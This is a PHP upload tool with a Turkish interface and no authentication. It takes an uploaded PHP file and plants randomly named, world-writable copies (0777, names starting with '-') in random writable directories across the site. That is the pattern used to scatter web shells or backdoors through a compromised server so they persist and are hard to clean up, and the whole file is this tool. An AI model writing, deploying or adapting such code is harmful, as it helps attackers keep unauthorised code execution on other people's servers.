<?php
$prefix = '-';
$extension = '.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['copy_count'])) {
    $upload_tmp = $_FILES['file']['tmp_name'];
    $upload_name = $_FILES['file']['name'];
    $copy_count = max(1, intval($_POST['copy_count'])); 

    if (!is_uploaded_file($upload_tmp)) {
        exit("❌ Dosya yüklenemedi.");
    }

    $tmp_path = __DIR__ . '/temp_uploaded_' . uniqid() . '.php';
    move_uploaded_file($upload_tmp, $tmp_path);
    chmod($tmp_path, 0777); 

    function getAllWritableDirs($dir) {
        $dirs = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($iterator as $file) {
            if ($file->isDir() && is_writable($file->getPathname())) {
                $dirs[] = $file->getPathname();
            }
        }
        return $dirs;
    }

    function randomString($length = 6) {
        return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, $length);
    }

    $all_dirs = getAllWritableDirs(__DIR__);
    $copied = 0;
    $copied_paths = [];

    while ($copied < $copy_count && !empty($all_dirs)) {
        $random_dir = $all_dirs[array_rand($all_dirs)];
        $new_file_name = $prefix . randomString() . $extension;
        $destination = $random_dir . DIRECTORY_SEPARATOR . $new_file_name;

        if (@copy($tmp_path, $destination)) {
            chmod($destination, 0777); 
            $copied_paths[] = $destination;
            $copied++;
        }
    }

    unlink($tmp_path);

    echo "<h3>Raporlar</h3>";
    if (empty($copied_paths)) {
        echo "<p>Hiçbir dosya kopyalanamadı.</p>";
    } else {
        echo "<ul>";
        foreach ($copied_paths as $path) {
            echo "<li>" . htmlspecialchars($path) . "</li>";
        }
        echo "</ul>";
    }

    echo '<br><a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '">↩ Geri Dön</a>';
    exit;
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" accept=".php" required><br><br>
    <input type="number" name="copy_count" min="1" max="100" value="5" required><br><br>
    <button type="submit">ZAZA</button>
</form>
